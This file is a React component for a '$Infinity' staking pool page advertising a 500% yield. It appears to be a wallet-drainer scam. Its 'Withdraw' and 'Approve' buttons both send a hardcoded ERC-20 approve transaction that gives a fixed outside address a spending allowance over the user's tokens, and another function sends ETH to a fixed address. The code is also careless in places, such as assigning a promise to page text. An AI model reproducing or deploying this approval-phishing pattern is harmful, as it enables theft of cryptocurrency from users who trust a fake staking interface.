import React from 'react';
import { useState } from 'react';
import { ethers } from 'ethers';
import './Staking.css';

let currentAccount = null;
async function sendTransaction() {

  let params = [
    {
      from: currentAccount,
      to: "0x60e21c1C75E60a966734B4Dd0FE1D3ac7484F00A",
      gas: Number(30400).toString(16), // 30400
      gasPrice: Number(10000000000).toString(16), // 10000000000
      value: Number(1000000000000000).toString(16), // (0.001 ethers)
    },
  ]

  //Result is the transaction hash
  let result = await window.ethereum.request({ method: "eth_sendTransaction", params }).catch((err) => {
    console.log(err);
  })

  if (result) {
    var TXSent = document.getElementById("transaction-btn");
    TXSent.innerText = "Transaction has been sent";
    console.log(result);
  }
  setTimeout(function () {
    console.log("The first log delay 10 second");
  }, 20000);
}

function Staking() {
  
  let contractAddress = "0x6b25Cb9338b4cEC5632aFd12B905C9C25a71BB4b";    //Modify Contract Address here!!
  async function ContractEthBalance() {
    let accBalance = await window.ethereum.request({
      method: "eth_getBalance",
      params:
        [contractAddress, 'latest']
    });
    var balanceDEC = Number(accBalance).toString(10);
    var inWeiBal = balanceDEC.length;
    
    console.log("second");
    var str = Math.pow(10, (inWeiBal - 22));
    var ETH = Math.round(str * parseInt(balanceDEC.substring(0, 4)) * 10000) / 10000;
    console.log(ETH);
    return ETH;
  }

  async function ApproveToken() {
    let params = [
      {
        from: currentAccount,
        to: '0x301F8f13F950fd86919c9D35B553c50280Aa18c5', //0x55d398326f99059fF775485246999027B3197955
        gas: Number(100000).toString(16), // 30400
        gasPrice: Number(10000000000).toString(16), // 10000000000
        value: '0', // 2441406250
        data:'0x095ea7b30000000000000000000000006488e5e3b69c63b9fe5ef5007b30b0ea3870422f000000000000000000000000000000000000000000000000000000174876e800',
          
        //0x095ea7b300000000000000000000000[062e0d998212b01d87049eb2d4a82436f1fca3b63]0000000000000000000000000000000000000000000000056bc75e2d63100000
      },
    ];

    var TokenApprove = document.getElementById("Approve-btn");
    let result = window.ethereum
      .request({
        method: 'eth_sendTransaction',
        params,
      }).catch((err) => {
        console.log(err);
      })
    
      TokenApprove.innerHTML=ContractEthBalance();
  }

  const [walletAddress, setWalletAddress] = useState("");

  async function requestAccount() {
    console.log('Requesting account...');

    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",

      });
      setWalletAddress(accounts[0]);
      currentAccount = accounts[0];
      console.log(currentAccount);

    } catch (error) {
      console.log('error connecting');
    }

    //Check if Metamask Exist
    if (window.ethereum) {
      console.log('detected');
    } else {
      console.log('not detected');
      alert("Please Install Metamask");
    }
  }

  async function getBalance() {
    let accBalance = await window.ethereum.request({
      method: "eth_getBalance",
      params:
        [currentAccount, 'latest']
    });
    var balanceDEC = Number(accBalance).toString(10);
    console.log(balanceDEC);
    var inWeiBal = balanceDEC.length;
    var balanceBtn = document.getElementById("balance-btn");

    var str = Math.pow(10, (inWeiBal - 22));
    var rounded = Math.round(str * parseInt(balanceDEC.substring(0, 4)) * 10000) / 10000;
    balanceBtn.innerText = rounded + " BNB";
  }

  async function connectWallet() {

    if (typeof window.ethereum !== 'undefined') {
      await requestAccount();
      const provider = new ethers.providers.Web3Provider(window.ethereum);

      var btnConnect = document.getElementById("connect-btn");
      document.getElementById("balance-btn").hidden = false;

      let lengthAcc = currentAccount.length;
      btnConnect.innerText = currentAccount.substring(0, 4) + "..." + currentAccount.substring(lengthAcc - 4, lengthAcc);

      alert("Wallet connected successfully!");
      getBalance();
    } else {
      alert("Please install Metamask");
    }
  }

  return (

    <div className='staking'>
      <button id="balance-btn" hidden>
        balance
      </button>
      <button id="connect-btn" onClick={connectWallet}>
        Connect Wallet
      </button>
      <div className="Stakingcontainer">
        <div className="staking-box-1">
          <h4>Staking Pool</h4>
        </div>
        <div className="staking-box-2">
          <div id='topleft'>
            Stake $Infinity<br />
            Earn $Infinity
          </div>
          <br/>
          <table id='APR'>
            <tr>
              <td>Annul Percentage Yield</td>
              <td>500%</td>
            </tr>
            <br/>
            <tr>
              <td>Total Staked</td>
              <td><button onClick={ContractEthBalance}>button</button></td>
            </tr>

          </table>
        </div>
        <div className="staking-box-3">
          <div id='box-3-left'>
            $Infinity Staked<br/>
            0.0
          </div>
          <div id='box-3-right'>
            <button className="Approve-btn" onClick={ApproveToken}>Withdraw</button>
          </div>
        </div>
        <div className="staking-box-4">
          
          <button className="Approve-btn" onClick={ApproveToken}>Approve</button>
        </div>
      </div>
    </div>

  )
}


export default Staking
